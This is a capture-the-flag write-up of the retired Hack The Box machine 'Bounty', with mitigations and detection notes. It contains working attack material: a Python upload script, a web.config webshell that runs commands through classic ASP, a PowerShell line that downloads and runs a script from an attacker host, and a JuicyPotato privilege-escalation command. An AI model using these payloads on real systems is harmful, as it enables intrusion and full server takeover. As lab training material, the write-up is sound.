---
machine: Bounty
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, iis, web.config, upload, juicypotato]
---

# Bounty — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

IIS 7.5 on Windows Server 2008 R2 with an upload form at `/transfer.aspx`. The filter blocks `.aspx` and `.asp` but accepts `.config`, so a `web.config` that registers the classic ASP engine for that extension gets executed. Afterwards `SeImpersonatePrivilege` allows JuicyPotato, and SYSTEM follows.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
80/tcp  open  http  Microsoft IIS httpd 7.5
```

Web only. IIS 7.5 means Server 2008 R2: `.asp`/`.aspx`, `web.config`, and the Potato family for escalation.

## Enumeration

```bash
gobuster dir -u http://<IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x asp,aspx,txt,config -t 50
```

```text
/transfer.aspx   (200)
/UploadedFiles/  (301 → 403)
```

The form has a JavaScript `ValidateFile` that only inspects the extension client-side. The POST needs the ASP.NET tokens:

```python
import requests, re

s = requests.Session()
r = s.get(f"http://{ip}/transfer.aspx")
vs = re.search(r'__VIEWSTATE[^>]+value="([^"]+)"', r.text).group(1)
ev = re.search(r'__EVENTVALIDATION[^>]+value="([^"]+)"', r.text).group(1)
data = {"__VIEWSTATE": vs, "__EVENTVALIDATION": ev, "btnUpload": "Upload"}
s.post(f"http://{ip}/transfer.aspx",
       files={"FileUpload1": ("shell.aspx", open("shell.aspx", "rb"))}, data=data)
```

Extension sweep: `jpg`, `png`, `gif` and `config` pass; `aspx`, `asp` and `txt` do not.

## Foothold

A `web.config` can declare which engine handles each extension. Register `asp.dll` for `*.config`, drop the rules protecting the file, and append classic ASP:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions><remove fileExtension=".config" /></fileExtensions>
        <hiddenSegments><remove segment="web.config" /></hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%
Set o = CreateObject("WScript.Shell")
Set e = o.Exec("cmd.exe /c whoami")
Response.Write(e.StdOut.ReadAll())
%>
```

```bash
curl -s http://<IP>/UploadedFiles/web.config
# bounty\merlin
```

For a reverse shell, swap `Exec` for an in-memory download:

```powershell
powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/shell.ps1')
```

## Escalation

```powershell
whoami /priv
```

```text
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

On 2008 R2 that means JuicyPotato: stand up a fake COM server, force a system object to authenticate, steal the token.

```powershell
C:\Windows\Temp\jp.exe -l 1343 -p C:\Windows\Temp\read.bat -t * `
  -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

`read.bat` copies the flag into `C:\Windows\Temp` and grants read access with `icacls`, because files created by SYSTEM are not readable by `merlin`:

```bat
type C:\Users\Administrator\Desktop\root.txt > C:\Windows\Temp\root.txt
icacls C:\Windows\Temp\root.txt /grant Everyone:F
```

## Evidence

- `whoami` → `bounty\merlin`, then execution as SYSTEM via JuicyPotato.
- `whoami /priv` with `SeImpersonatePrivilege`.
- `root.txt` contents (redacted).

## Lessons learned

- On IIS, when `.aspx` is blocked, `.config` often passes and is executable by design.
- ASP.NET forms require `__VIEWSTATE` and `__EVENTVALIDATION`: without them the POST is ignored.
- JavaScript validation is not a defence; the real filter was server-side, and it was incomplete too.
- `SeImpersonatePrivilege` is the standard escalation for an IIS worker.
- When reverse shells are blocked, a `.bat` that copies and shares the file works just as well.

## Mitigations and detection

- Block uploads of `.config`, `.asp`, `.aspx` and any executable extension; validate by content and rename.
- Serve uploads from a directory without execute permissions (restricted `<handlers>`).
- Disable classic ASP when unused and keep request filtering at defaults.
- Remove `SeImpersonatePrivilege` from application identities where possible.
- Detection: `web.config` created inside upload directories, requests to `/UploadedFiles/*.config`, `asp.dll` execution.
- MITRE: T1505.003, T1190, T1134.001.

## References

- IIS `web.config` handler registration.
- JuicyPotato (BITS CLSID).
- MITRE ATT&CK: T1505.003, T1134.001.
